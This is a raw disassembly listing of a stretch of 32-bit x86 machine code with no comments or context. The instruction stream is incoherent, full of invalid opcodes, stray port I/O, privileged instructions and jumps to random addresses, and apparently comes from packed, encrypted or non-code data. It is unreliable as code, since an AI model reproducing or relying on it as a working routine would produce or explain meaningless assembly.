  41a3d4:	sub    ebx,DWORD PTR [esi-0x7bd5b7d1]
  41a3da:	xchg   edi,esp
  41a3dc:	fisub  DWORD PTR [edi+0x5f]
  41a3df:	ins    BYTE PTR es:[edi],dx
  41a3e0:	or     eax,0xc09ea65
  41a3e5:	fcmovnu st,st(5)
  41a3e7:	jecxz  0x41a39a
  41a3e9:	ret    0x1aa1
  41a3ec:	jmp    0x41a44e
  41a3ee:	mov    esp,DWORD PTR [ebx-0x51]
  41a3f1:	call   0x2ba9f2db
  41a3f6:	test   edx,eax
  41a3f8:	cli    
  41a3f9:	call   0x772d3c3
  41a3fe:	lods   al,BYTE PTR ds:[esi]
  41a3ff:	xchg   edx,eax
  41a400:	sub    eax,0x214064f2
  41a405:	das    
  41a406:	cdq    
  41a407:	mov    bl,0x54
  41a409:	dec    esp
  41a40a:	pop    edi
  41a40b:	adc    DWORD PTR [ecx-0x44],edx
  41a40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a40f:	std    
  41a410:	popa   
  41a411:	dec    eax
  41a412:	xchg   ebx,eax
  41a413:	pop    ss
  41a414:	pop    esp
  41a415:	inc    esi
  41a416:	repz arpl WORD PTR [ebx+0x3287bbd3],ax
  41a41d:	arpl   WORD PTR [ebp+0x7e],ax
  41a420:	sub    DWORD PTR [ecx+0x3da12e89],esp
  41a426:	pop    ebp
  41a427:	or     DWORD PTR [eax+0x30],ebx
  41a42a:	in     al,0x60
  41a42c:	cdq    
  41a42d:	push   edi
  41a42e:	mov    eax,?
  41a430:	aas    
  41a431:	daa    
  41a432:	mov    ds:0x43632dff,eax
  41a437:	shr    BYTE PTR [ebx+0x77424db0],1
  41a43d:	jp     0x41a3ce
  41a43f:	dec    eax
  41a440:	nop
  41a441:	add    al,0xb4
  41a443:	pop    eax
  41a444:	daa    
  41a445:	dec    edx
  41a446:	add    eax,0x95a87ce1
  41a44b:	mov    ah,BYTE PTR [edx-0x7728fb79]
  41a451:	push   esp
  41a452:	cmp    BYTE PTR [ecx],dh
  41a454:	mov    dh,0x73
  41a456:	add    DWORD PTR [edi+0x10a3eb85],ecx
  41a45c:	sub    DWORD PTR [ecx+0x6647df2f],0xffffffe3
  41a463:	clc    
  41a464:	and    ebx,DWORD PTR [esi+0x70]
  41a467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a468:	adc    eax,0xbeae991c
  41a46d:	cmc    
  41a46e:	push   eax
  41a46f:	retf   0x1d76
  41a472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a473:	fmul   DWORD PTR [ebx]
  41a475:	jg     0x41a4b5
  41a477:	sbb    DWORD PTR [edi-0x6c5495c4],edx
  41a47d:	sbb    BYTE PTR [ecx+0x1f],al
  41a480:	adc    DWORD PTR [esi-0x5d],esi
  41a483:	pop    eax
  41a484:	ja     0x41a4eb
  41a486:	(bad)  
  41a487:	sbb    eax,DWORD PTR ds:0xb681afa
  41a48d:	jl     0x41a42f
  41a48f:	jb     0x41a4e1
  41a491:	push   0x5
  41a493:	pop    edi
  41a494:	stos   DWORD PTR es:[edi],eax
  41a495:	les    edi,FWORD PTR [ecx-0x62]
  41a498:	xchg   edx,eax
  41a499:	dec    ebp
  41a49a:	xchg   esi,eax
  41a49b:	jg     0x41a4ee
  41a49d:	out    0x24,al
  41a49f:	loop   0x41a425
  41a4a1:	pop    esp
  41a4a2:	sbb    eax,eax
  41a4a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4a5:	or     DWORD PTR [eax-0x2b],esp
  41a4a8:	adc    BYTE PTR [edx-0x26cb6ac6],0xba
  41a4af:	push   0xdeb4591f
  41a4b4:	push   esp
  41a4b5:	xor    eax,0x869aa4f
  41a4ba:	in     eax,0x8e
  41a4bc:	xor    al,0x55
  41a4be:	scas   eax,DWORD PTR es:[edi]
  41a4bf:	xor    BYTE PTR [ecx],ch
  41a4c1:	ss jae 0x41a46d
  41a4c4:	in     eax,dx
  41a4c5:	(bad)  
  41a4c6:	lea    esi,[ecx]
  41a4c8:	inc    edi
  41a4c9:	cmp    cl,BYTE PTR [eax-0x27279b1a]
  41a4cf:	mov    edi,0x8b57c791
  41a4d4:	daa    
  41a4d5:	int3   
  41a4d6:	xor    DWORD PTR [edi+0x55],esp
  41a4d9:	mov    esi,DWORD PTR [eax+0x6f3b62d7]
  41a4df:	add    al,0x56
  41a4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4e2:	(bad)  
  41a4e3:	sbb    al,0xc0
  41a4e5:	xor    DWORD PTR [eax],0x41
  41a4e8:	mov    esp,0x211104db
  41a4ed:	and    DWORD PTR [ecx+esi*4+0x102367cd],ebx
  41a4f4:	(bad)  
  41a4f6:	xchg   edx,eax
  41a4f7:	push   eax
  41a4f8:	push   ebp
  41a4fa:	and    DWORD PTR [eax-0x41],0xffffff86
  41a4fe:	sbb    al,0xa9
  41a500:	or     al,0xc5
  41a502:	xchg   edi,eax
  41a503:	mov    bl,0x3f
  41a505:	in     al,dx
  41a506:	add    dh,BYTE PTR [edi-0x7e]
  41a509:	jl     0x41a4d6
  41a50b:	shl    BYTE PTR [edx],1
  41a50d:	push   eax
  41a50e:	test   DWORD PTR [eax+ecx*8],esp
  41a511:	ret    
  41a512:	push   cs
  41a513:	mov    al,ds:0x6c14f95
  41a518:	pop    ds
  41a519:	fisttp WORD PTR [ebp+0xd]
  41a51c:	dec    eax
  41a51d:	xchg   esi,eax
  41a51e:	popf   
  41a51f:	xlat   BYTE PTR ds:[ebx]
  41a520:	xor    cl,BYTE PTR [ecx-0xa369fc8]
  41a526:	loope  0x41a595
  41a528:	jno    0x41a4c4
  41a52a:	clc    
  41a52b:	pushf  
  41a52c:	ror    dh,1
  41a52e:	cmp    BYTE PTR [esi+0x34],ah
  41a531:	idiv   ebx
  41a533:	push   0x9
  41a535:	pop    edi
  41a536:	adc    al,0x34
  41a538:	(bad)  
  41a53a:	shr    bl,cl
  41a53c:	scas   eax,DWORD PTR es:[edi]
  41a53d:	xor    BYTE PTR [ebx-0xb],cl
  41a540:	test   ecx,eax
  41a542:	fcmovbe st,st(2)
  41a544:	inc    ecx
  41a545:	sahf   
  41a546:	jnp    0x41a4d4
  41a548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a549:	cmc    
  41a54a:	mov    ebp,0x76579652
  41a54f:	fnsave [eax]
  41a551:	jge    0x41a5ad
  41a553:	xchg   ebp,eax
  41a554:	jmp    0x41a54b
  41a556:	and    edx,DWORD PTR [edx+0x2c747a75]
  41a55c:	shr    BYTE PTR [esi-0x4d],1
  41a55f:	ds inc ebx
  41a561:	mov    eax,0x119ad451
  41a566:	jecxz  0x41a5a6
  41a568:	jne    0x41a4fa
  41a56a:	push   ebx
  41a56b:	daa    
  41a56c:	xor    BYTE PTR [edx+0x79933258],0xfb
  41a573:	jle    0x41a5a4
  41a575:	mov    BYTE PTR [ecx+0x58],al
  41a578:	test   al,0xda
  41a57a:	mov    esp,0x6f87dfcd
  41a57f:	cs cmp al,0xa4
  41a582:	(bad)
  41a586:	test   BYTE PTR [edi+eax*2],0xf2
  41a58a:	fcmovnb st,st(4)
  41a58c:	int    0x1d
  41a58e:	ins    DWORD PTR es:[edi],dx
  41a58f:	xchg   ebp,eax
  41a590:	sbb    eax,0xab6af27c
  41a595:	sub    eax,0x274dd1cf
  41a59a:	(bad)  
  41a59b:	jecxz  0x41a5fc
  41a59d:	inc    edx
  41a59e:	jnp    0x41a5d6
  41a5a0:	mov    eax,ds:0xdd377298
  41a5a5:	inc    ebx
  41a5a6:	and    DWORD PTR [ebx+eiz*2-0x3f],ecx
  41a5aa:	shl    DWORD PTR [esi-0x7c],1
  41a5ad:	or     DWORD PTR [esp+ecx*4-0x25e4d37f],ebp
  41a5b4:	jp     0x41a59b
  41a5b6:	xor    esp,ecx
  41a5b8:	in     al,dx
  41a5b9:	sub    DWORD PTR es:[ebx-0x78],0x4bce2144
  41a5c1:	aam    0xdc
  41a5c3:	push   ds
  41a5c4:	sub    ebp,ecx
  41a5c6:	bound  ecx,QWORD PTR [ebx-0x239ffb0d]
  41a5cc:	lds    esp,FWORD PTR [ebp-0x50bbe706]
  41a5d2:	rcl    BYTE PTR [esi-0x30],1
  41a5d5:	xchg   ebp,eax
  41a5d6:	push   esp
  41a5d7:	pop    esp
  41a5d8:	in     al,0xb4
  41a5da:	or     DWORD PTR [esi],esp
  41a5dc:	or     DWORD PTR [ebp+esi*1+0x5bf4ac4],esi
  41a5e3:	ins    DWORD PTR es:[edi],dx
  41a5e4:	fldenv [ecx]
  41a5e6:	icebp  
  41a5e7:	enter  0x3a5e,0xb9
  41a5eb:	or     ah,dh
  41a5ed:	popf   
  41a5ee:	(bad)  
  41a5f0:	cmp    al,0x58
  41a5f2:	nop
  41a5f3:	xchg   ebx,eax
  41a5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f5:	mov    ebp,0xafadd6f5
  41a5fa:	add    BYTE PTR [ecx],bh
  41a5fc:	je     0x41a611
  41a5fe:	pop    eax
  41a5ff:	in     eax,0x44
  41a601:	lock inc ebp
  41a603:	ja     0x41a675
  41a605:	fidivr WORD PTR [ebp+eiz*8+0x77]
  41a609:	cmp    edi,ebp
  41a60b:	in     eax,0x4
  41a60d:	sub    cl,0x2b
  41a610:	call   0x1745:0x726934a1
  41a617:	sbb    ah,al
  41a619:	call   DWORD PTR [edx-0x4b064c42]
  41a61f:	std    
  41a620:	xor    ebx,DWORD PTR [ecx-0x6b]
  41a623:	dec    ecx
  41a624:	scas   al,BYTE PTR es:[edi]
  41a625:	sar    BYTE PTR [eax-0x41],cl
  41a628:	mov    ah,0x2e
  41a62a:	mov    BYTE PTR ds:0x991b4622,cl
  41a630:	mov    ?,WORD PTR [esi]
  41a632:	aad    0xf
  41a634:	dec    esp
  41a635:	pusha  
  41a636:	jmp    DWORD PTR [edx]
  41a638:	adc    bh,dh
  41a63a:	(bad)  
  41a63b:	aas    
  41a63c:	pop    ecx
  41a63d:	cli    
  41a63e:	mov    eax,ds:0x499e5433
  41a643:	add    dl,BYTE PTR [edi+ecx*1+0x725d1885]
  41a64a:	jne    0x41a656
  41a64c:	pushf  
  41a64d:	mov    ecx,0x269e55ec
  41a652:	mov    bh,0x16
  41a654:	and    eax,0xc30a8957
  41a659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a65a:	in     al,dx
  41a65b:	jp     0x41a675
  41a65d:	push   edx
  41a65e:	xchg   ebx,eax
  41a65f:	mov    dl,0xa5
  41a661:	aam    0xcc
  41a663:	fcom   DWORD PTR [eax-0x76]
  41a666:	into   
  41a667:	pop    eax
  41a668:	aas    
  41a669:	cmp    BYTE PTR [ecx-0x55320c01],dl
  41a66f:	outs   dx,BYTE PTR ds:[esi]
  41a670:	imul   ecx,DWORD PTR [edx+0x39],0x6684cbfc
  41a677:	lods   eax,DWORD PTR ds:[esi]
  41a678:	outs   dx,BYTE PTR ds:[esi]
  41a679:	pop    eax
  41a67a:	add    edi,DWORD PTR [ecx+0x53e1f218]
  41a680:	pushf  
  41a681:	shl    BYTE PTR [edi+edx*1-0x2d],cl
  41a685:	xor    al,0xd4
  41a687:	xchg   edi,eax
  41a688:	xlat   BYTE PTR ds:[ebx]
  41a689:	cmp    bl,bh
  41a68b:	push   edx
  41a68c:	push   es
  41a68d:	jmp    0x4d57c21d
  41a692:	inc    esp
  41a693:	iret   
  41a694:	adc    esp,DWORD PTR [eax+0x3]
  41a697:	pop    esi
  41a698:	jns    0x41a647
  41a69a:	jae    0x41a6d9
  41a69c:	sbb    al,0x68
  41a69e:	shl    dl,0x52
  41a6a1:	lahf   
  41a6a2:	fs repz cmp dl,dh
  41a6a6:	in     al,0xf9
  41a6a8:	or     esp,DWORD PTR [ebp-0x53ee2f99]
  41a6ae:	dec    esi
  41a6af:	jbe    0x41a664
  41a6b1:	ds cmp eax,0xca2523e
  41a6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6b8:	aaa    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	sub    DWORD PTR [edx+edi*8+0x4f1f291a],eax
  41a6c1:	sbb    esi,DWORD PTR [esi+0x41e8d43e]
  41a6c7:	mov    bl,0xf9
  41a6c9:	mov    ebx,0x5fb22c56
  41a6ce:	xor    dh,cl
  41a6d0:	mov    ebp,0xec37ad83
  41a6d5:	idiv   DWORD PTR [edi-0x61]
  41a6d8:	mov    ecx,0xab98a2d0
  41a6dd:	dec    edx
  41a6de:	mov    dl,0x7
  41a6e0:	sub    eax,0xe21ab3c
  41a6e5:	or     dh,BYTE PTR [edx+edi*2]
  41a6e8:	lahf   
  41a6e9:	cld    
  41a6ea:	jbe    0x41a6ae
  41a6ec:	repz push bx
  41a6ef:	xor    al,0x9
  41a6f1:	mov    dh,BYTE PTR ds:0x6bf62d88
  41a6f7:	jbe    0x41a72c
  41a6f9:	push   es
  41a6fa:	xor    ch,BYTE PTR [ebx]
  41a6fc:	mov    esi,0x920adc1b
  41a701:	adc    eax,0xcd3f3050
  41a706:	ja     0x41a75c
  41a708:	dec    ecx
  41a709:	and    BYTE PTR [esi],ah
  41a70b:	bound  esp,QWORD PTR [edx-0x603e632b]
  41a711:	cdq    
  41a712:	jnp    0x41a70b
  41a714:	cmp    DWORD PTR [esi+0x21e74c97],ecx
  41a71a:	repz add al,0x60
  41a71d:	inc    ebp
  41a71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71f:	sub    eax,0x8bb8890b
  41a724:	enter  0xe5d0,0xee
  41a728:	push   ecx
  41a729:	push   0x30
  41a72b:	cmp    BYTE PTR [ebx],bh
  41a72d:	pop    ecx
  41a72e:	fdiv   QWORD PTR [edi+0x7466a0d4]
  41a734:	out    0xd0,eax
  41a736:	xor    BYTE PTR [ebx],bl
  41a738:	push   ebp
  41a739:	lea    ecx,[ecx+edi*1-0x7492d07e]
  41a740:	hlt    
  41a741:	test   al,0x24
  41a743:	call   0x52e4:0x8e547acf
  41a74a:	mov    dh,0x28
  41a74c:	sub    ecx,DWORD PTR [eax]
  41a74e:	inc    eax
  41a74f:	push   0x197cac21
  41a754:	push   eax
  41a755:	lods   eax,DWORD PTR ds:[esi]
  41a756:	xor    eax,0xfa04e8da
  41a75b:	cli    
  41a75c:	pavgw  mm7,mm3
  41a75f:	cmp    eax,0xc208680b
  41a764:	stos   DWORD PTR es:[edi],eax
  41a765:	mov    ds:0xcc1728a5,eax
  41a76a:	ins    BYTE PTR es:[edi],dx
  41a76b:	mov    ds:0xfca47432,al
  41a770:	mov    ds:0x38bc1587,eax
  41a775:	jle    0x41a723
  41a777:	dec    ebx
  41a778:	fnsave [ebx*8+0x31e612dd]
  41a77f:	loop   0x41a769
  41a781:	gs jbe 0x41a732
  41a784:	pop    ecx
  41a785:	out    0xd4,eax
  41a787:	jne    0x41a784
  41a789:	mov    bh,0xd
  41a78b:	inc    edx
  41a78c:	push   esp
  41a78d:	fsubr  st(4),st
  41a78f:	dec    eax
  41a790:	stc    
  41a791:	es out dx,eax
  41a793:	push   eax
  41a794:	es scas eax,DWORD PTR es:[edi]
  41a796:	xchg   esp,eax
  41a797:	sub    al,0x2
  41a799:	mov    al,ds:0x563dbfd0
  41a79e:	hlt    
  41a79f:	das    
  41a7a0:	fmul   st,st(7)
  41a7a2:	and    ebp,DWORD PTR [eax-0x73ff5fac]
  41a7a8:	mov    al,0xd5
  41a7aa:	mov    ebp,0x216b870
  41a7af:	fld    QWORD PTR gs:[esi]
  41a7b2:	dec    ecx
  41a7b3:	fdiv   QWORD PTR [ebp-0x65]
  41a7b6:	push   cs
  41a7b7:	out    0x8f,eax
  41a7b9:	std    
  41a7ba:	inc    esp
  41a7bb:	dec    ebp
  41a7bc:	nop
  41a7bd:	sbb    BYTE PTR [ebx],bl
  41a7bf:	out    0x48,al
  41a7c1:	pop    ds
  41a7c2:	or     DWORD PTR [eax+0x1e],eax
  41a7c5:	retf   
  41a7c6:	(bad)  
  41a7c7:	sbb    DWORD PTR [esi-0x41451d31],ebp
  41a7cd:	repnz pop esi
  41a7cf:	out    0xdb,eax
  41a7d1:	daa    
  41a7d2:	mov    ebx,0x4fd6e54f
  41a7d7:	adc    eax,DWORD PTR [edi-0x67]
  41a7da:	out    0x1a,al
  41a7dc:	imul   esi,ebx,0x7548357c
  41a7e2:	and    esp,ecx
  41a7e4:	jbe    0x41a80b
  41a7e6:	add    esp,ebp
  41a7e8:	sbb    eax,0xcd2bdc8d
  41a7ed:	jo     0x41a78b
  41a7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7f0:	push   esp
  41a7f1:	or     cl,BYTE PTR [edx]
  41a7f3:	xor    al,0xc
  41a7f5:	jnp    0x41a7b9
  41a7f7:	add    al,0xd4
  41a7f9:	mov    esi,0x193e42b7
  41a7fe:	push   esi
  41a7ff:	sub    eax,DWORD PTR [edi-0x40]
  41a802:	sbb    ch,dh
  41a804:	jae    0x41a7b0
  41a806:	jnp    0x41a7e6
  41a808:	cwde   
  41a809:	mov    esi,0x9ff73fac
  41a80e:	std    
  41a80f:	(bad)  
  41a810:	push   ecx
  41a811:	ss push 0xf494cba8
  41a817:	retf   
  41a818:	adc    al,0x8f
  41a81a:	idiv   ch
  41a81c:	out    0xdf,eax
  41a81e:	jmp    0xaf77:0xca090fbe
  41a825:	in     al,dx
  41a826:	stc    
  41a827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a828:	and    eax,0x1a0538d1
  41a82d:	scas   al,BYTE PTR es:[edi]
  41a82e:	or     esp,DWORD PTR [ecx-0x7]
  41a831:	retf   0xeb0a
  41a834:	iret   
  41a835:	dec    eax
  41a836:	sbb    ebp,ecx
  41a838:	push   eax
  41a839:	(bad)  
  41a83a:	fwait
  41a83b:	jg     0x41a804
  41a83d:	loopne 0x41a897
  41a83f:	es out dx,eax
  41a841:	fwait
  41a842:	sbb    al,0x34
  41a844:	dec    ecx
  41a845:	adc    al,0xa3
  41a847:	rol    BYTE PTR [ecx+eax*8+0x901586c],0xde
  41a84f:	dec    esp
  41a850:	(bad)  
  41a851:	lahf   
  41a852:	xchg   edi,eax
  41a853:	mov    al,0xbf
  41a855:	push   es
  41a856:	mov    bl,0xba
  41a858:	jmp    0x28e5c2c6
  41a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a85e:	daa    
  41a85f:	repnz sbb al,0x2b
  41a862:	sahf   
  41a863:	mov    esi,0xa1ea3070
  41a868:	(bad)  
  41a869:	fsub   DWORD PTR [eax+0x31]
  41a86c:	cwde   
  41a86d:	and    DWORD PTR [eax+ebp*1-0x3223637c],0xffffffb4
  41a875:	xchg   esi,eax
  41a876:	test   BYTE PTR [esi],bh
  41a878:	dec    edi
  41a879:	cdq    
  41a87a:	inc    ebx
  41a87b:	mov    ebx,0x8aae76db
  41a880:	in     eax,dx
  41a881:	cs mov ah,0x92
  41a884:	clc    
  41a885:	inc    ebx
  41a886:	jb     0x41a8b7
  41a888:	mov    ah,0x8f
  41a88a:	sbb    bh,dh
  41a88c:	mov    edi,0xa266cdb
  41a891:	mov    ah,0xad
  41a893:	cli    
  41a894:	jb     0x41a8be
  41a896:	lahf   
  41a897:	push   cs
  41a898:	and    al,0x1d
  41a89a:	mov    eax,0xf4a97a91
  41a89f:	loope  0x41a85a
  41a8a1:	add    esp,DWORD PTR [ebx+0x7a]
  41a8a4:	or     BYTE PTR [ebp-0x73d8f626],ch
  41a8aa:	pusha  
  41a8ab:	inc    esi
  41a8ac:	adc    eax,0x9e558062
  41a8b1:	jae    0x41a846
  41a8b3:	jp     0x41a85f
  41a8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b6:	push   es
  41a8b7:	loope  0x41a8d2
  41a8b9:	mul    DWORD PTR [ecx-0x35]
  41a8bc:	std    
  41a8bd:	pop    ds
  41a8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8bf:	mov    dl,al
  41a8c1:	push   edi
  41a8c2:	push   0xbb2d90e4
  41a8c7:	out    dx,eax
  41a8c8:	cmc    
  41a8c9:	cwde   
  41a8ca:	adc    BYTE PTR [ecx-0x17153b19],bl
  41a8d0:	retf   0x29ee
  41a8d3:	sbb    eax,0x2f6b168
  41a8d8:	dec    esp
  41a8d9:	lahf   
  41a8da:	loopne 0x41a89b
  41a8dc:	jmp    0x41a948
  41a8de:	push   eax
  41a8df:	or     al,BYTE PTR [ecx]
  41a8e1:	scas   eax,DWORD PTR es:[edi]
  41a8e2:	mov    eax,ds:0x52dfb40
  41a8e7:	dec    ebx
  41a8e8:	fs mov dh,0x8d
  41a8eb:	sbb    edx,DWORD PTR [edx]
  41a8ed:	or     ch,BYTE PTR [ecx+0x12]
  41a8f0:	xchg   esi,eax
  41a8f1:	pop    es
  41a8f2:	loope  0x41a92d
  41a8f4:	lea    ecx,[ecx-0x2746add0]
  41a8fa:	ret    0xfc19
  41a8fd:	mov    al,0x83
  41a8ff:	sti    
  41a900:	mov    ch,0x6b
  41a902:	into   
  41a903:	leave  
  41a904:	ins    DWORD PTR es:[edi],dx
  41a905:	cwde   
  41a906:	mov    ebx,0x3a3e9795
  41a90b:	sti    
  41a90c:	xor    ah,BYTE PTR [edi+0x1ef371fe]
  41a912:	add    BYTE PTR [eax],bh
  41a914:	xchg   ebx,eax
  41a915:	push   edi
  41a916:	jl     0x41a949
  41a918:	arpl   WORD PTR [ecx+0x5f1333c4],si
  41a91e:	jl     0x41a954
  41a920:	inc    ecx
  41a921:	ss jmp 0x41a949
  41a924:	pop    eax
  41a925:	std    
  41a926:	hlt    
  41a927:	mov    edi,0xde838ce9
  41a92c:	aaa    
  41a92d:	adc    ecx,DWORD PTR [edi+ecx*8+0x8]
  41a931:	out    dx,al
  41a932:	or     DWORD PTR [ebx+eiz*4+0x2929bb3b],ebp
  41a939:	push   cs
  41a93a:	xor    ecx,DWORD PTR [bp-0x35]
  41a93e:	and    eax,0xe47c7271
  41a943:	sub    al,0x15
  41a945:	sub    eax,0x8a693673
  41a94a:	and    edx,edi
  41a94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a94d:	xor    ch,BYTE PTR [ebp-0x70]
  41a950:	add    dl,BYTE PTR [ebx-0x7a]
  41a953:	popf   
  41a954:	pop    es
  41a955:	loope  0x41a981
  41a957:	popf   
  41a958:	mov    ah,0x2a
  41a95a:	sti    
  41a95b:	mov    dl,0xf5
  41a95d:	rcl    BYTE PTR [ecx],1
  41a95f:	arpl   WORD PTR [edx],ax
  41a961:	fld    QWORD PTR [edx+0x5a8b9a5b]
  41a967:	retf   
  41a968:	mov    eax,ds:0x738a4855
  41a96d:	enter  0xa776,0xf9
  41a971:	cs pop esi
  41a973:	ror    BYTE PTR [esp+edi*4-0x26],1
  41a977:	and    eax,0x57f37599
  41a97c:	xchg   edx,eax
  41a97d:	int    0x55
  41a97f:	test   BYTE PTR [esi+ecx*1],0x8c
  41a983:	lods   eax,DWORD PTR ds:[esi]
  41a984:	mov    cs:0x246712c8,al
  41a98a:	fimul  DWORD PTR [ebx]
  41a98c:	ret    0xdba0
  41a98f:	popa   
  41a990:	sbb    BYTE PTR [esi],al
  41a992:	ret    0xd938
  41a995:	push   edx
  41a996:	scas   al,BYTE PTR es:[edi]
  41a997:	mov    eax,ds:0xe97b38ff
  41a99c:	jne    0x41a9ef
  41a99e:	mov    al,0xa2
  41a9a0:	dec    edi
  41a9a1:	and    eax,0xf72a35ff
  41a9a6:	rol    BYTE PTR [eax-0x4397eafa],cl
  41a9ac:	in     al,dx
  41a9ad:	xchg   edx,eax
  41a9ae:	sub    al,0x3e
  41a9b0:	daa    
  41a9b1:	pop    ebp
  41a9b2:	mov    BYTE PTR [edx+0x4a],cl
  41a9b5:	and    cx,ax
  41a9b8:	mov    edx,0x6c95603a
  41a9bd:	in     al,dx
  41a9be:	mov    ebp,0x3daabc26
  41a9c3:	xchg   esi,eax
  41a9c4:	xlat   BYTE PTR ds:[ebx]
  41a9c5:	out    dx,eax
  41a9c6:	mov    eax,ds:0xc01a693
  41a9cb:	int3   
  41a9cc:	push   ds
  41a9cd:	pop    eax
  41a9ce:	aam    0x2
  41a9d0:	and    DWORD PTR [eax+0x4],ecx
  41a9d3:	xchg   bh,bl
  41a9d5:	mov    ecx,0x2e48bfd1
  41a9da:	dec    esi
  41a9db:	or     ebx,DWORD PTR [ebp+0x35e2752f]
  41a9e1:	mov    ebx,0xc1de21d4
  41a9e6:	sub    DWORD PTR [edx+ecx*2+0x47],esi
  41a9ea:	fwait
  41a9eb:	in     eax,dx
  41a9ec:	jp     0x41a9db
  41a9ee:	push   cs
  41a9ef:	fidiv  DWORD PTR [edx+0x49]
  41a9f2:	(bad)  
  41a9f3:	ds pushf 
  41a9f5:	ss fcmovu st,st(4)
  41a9f8:	jbe    0x41a9fa
  41a9fa:	jg     0x41aa1d
  41a9fc:	mov    eax,ds:0x17233fe7
  41aa01:	ret    0xdc7d
  41aa04:	pop    es
  41aa05:	aaa    
  41aa06:	int3   
  41aa07:	imul   ecx,DWORD PTR [edx-0x23],0x28
  41aa0b:	psubusw mm5,QWORD PTR [ebp-0x14]
  41aa0f:	xchg   edi,eax
  41aa10:	out    dx,eax
  41aa11:	pop    ss
  41aa12:	jmp    DWORD PTR [esi+eiz*8]
  41aa15:	daa    
  41aa16:	not    DWORD PTR [edx+ebx*2]
  41aa19:	addr16 pop esp
  41aa1b:	add    BYTE PTR [edx+0x46],al
  41aa1e:	pop    eax
  41aa1f:	push   ebx
  41aa20:	scas   eax,DWORD PTR es:[edi]
  41aa21:	jo     0x41a9e3
  41aa23:	mov    cl,0x27
  41aa25:	icebp  
  41aa26:	xchg   ebp,eax
  41aa27:	dec    BYTE PTR [ebp-0x3a]
  41aa2a:	inc    edi
  41aa2b:	jg     0x41aa6c
  41aa2d:	or     al,0x56
  41aa2f:	in     al,dx
  41aa30:	xor    bh,al
  41aa32:	mov    esp,0xa0700cc6
  41aa37:	dec    edi
  41aa38:	push   ebp
  41aa39:	test   al,0x97
  41aa3b:	sub    eax,0x7eb232fb
  41aa40:	iret   
  41aa41:	outs   dx,DWORD PTR ds:[esi]
  41aa42:	push   ecx
  41aa43:	fist   WORD PTR [edi-0x5dffe55f]
  41aa49:	ds xchg ebp,eax
  41aa4b:	retf   0xa2c
  41aa4e:	aaa    
  41aa4f:	arpl   sp,cx
  41aa51:	pop    ebx
  41aa52:	leave  
  41aa53:	int3   
  41aa54:	jp     0x41aac3
  41aa56:	jmp    0x41aa75
  41aa58:	fisubr DWORD PTR [ecx]
  41aa5a:	dec    esi
  41aa5b:	nop
  41aa5c:	gs hlt 
  41aa5e:	jb     0x41aaa8
  41aa60:	inc    ebp
  41aa61:	mov    gs,WORD PTR [edx+0x8]
  41aa64:	arpl   WORD PTR [ecx+0x43],dx
  41aa67:	or     eax,0x149514c4
  41aa6c:	out    dx,eax
  41aa6d:	or     bl,dl
  41aa6f:	loope  0x41aa1b
  41aa71:	rcr    DWORD PTR [ecx],0xf3
  41aa74:	mov    bh,0x67
  41aa76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa77:	adc    BYTE PTR [ebx+0x35dcee1],ah
  41aa7d:	sub    BYTE PTR [ebp-0x6fba3f23],bh
  41aa83:	sub    eax,0xd4265280
  41aa88:	data16 jecxz 0x41aa8a
  41aa8b:	pop    ecx
  41aa8c:	out    dx,eax
  41aa8d:	imul   edi,DWORD PTR [edi+eax*1],0x9
  41aa91:	and    DWORD PTR [ebx-0x3f],edx
  41aa94:	nop
  41aa95:	jg     0x41aa9d
  41aa97:	mov    al,0x85
  41aa99:	pop    esp
  41aa9a:	mov    ds:0xbdcabe3f,eax
  41aa9f:	mov    al,0xc
  41aaa1:	jmp    0x5d39a5c6
  41aaa6:	inc    edx
  41aaa7:	xor    al,0xb8
  41aaa9:	in     eax,0x6
  41aaab:	adc    esi,esp
  41aaad:	sub    ebx,esp
  41aaaf:	stos   DWORD PTR es:[edi],eax
  41aab0:	aad    0x1c
  41aab2:	aam    0xbf
  41aab4:	inc    esp
  41aab5:	icebp  
  41aab6:	test   BYTE PTR [ebp-0x3e3c54a3],0x4b
  41aabd:	push   ecx
  41aabe:	shr    DWORD PTR [esi],0xf4
  41aac1:	jnp    0x41aa97
  41aac3:	loopne 0x41aabc
  41aac5:	mov    DWORD PTR [eax-0x17],edx
  41aac8:	mov    bl,0x72
  41aaca:	or     DWORD PTR [esi-0x65fb44b5],0x37305b4d
  41aad4:	in     eax,dx
  41aad5:	iret   
  41aad6:	and    bx,WORD PTR [esi-0x42c5d926]
  41aadd:	mov    BYTE PTR [ecx+0xd3f37de],dh
  41aae3:	pop    edi
  41aae4:	inc    ebp
  41aae5:	cmp    ebx,DWORD PTR [ecx]
  41aae7:	and    eax,esp
  41aae9:	push   es
  41aaea:	jge    0x41aaee
  41aaec:	or     bh,BYTE PTR [edx+0x6b]
  41aaef:	mov    ebp,ss
  41aaf1:	fs pop esp
  41aaf3:	cmp    eax,0xe2da0d1f
  41aaf8:	xchg   esi,eax
  41aaf9:	test   DWORD PTR [eax-0x4c40e0c4],edi
  41aaff:	pop    ds
  41ab00:	sahf   
  41ab01:	outs   dx,DWORD PTR ds:[esi]
  41ab02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab03:	jge    0x41ab80
  41ab05:	test   DWORD PTR [eax],ebx
  41ab07:	fwait
  41ab08:	xchg   ebx,eax
  41ab09:	and    DWORD PTR [ecx],ebx
  41ab0b:	adc    al,0xe6
  41ab0d:	sbb    cl,al
  41ab0f:	clc    
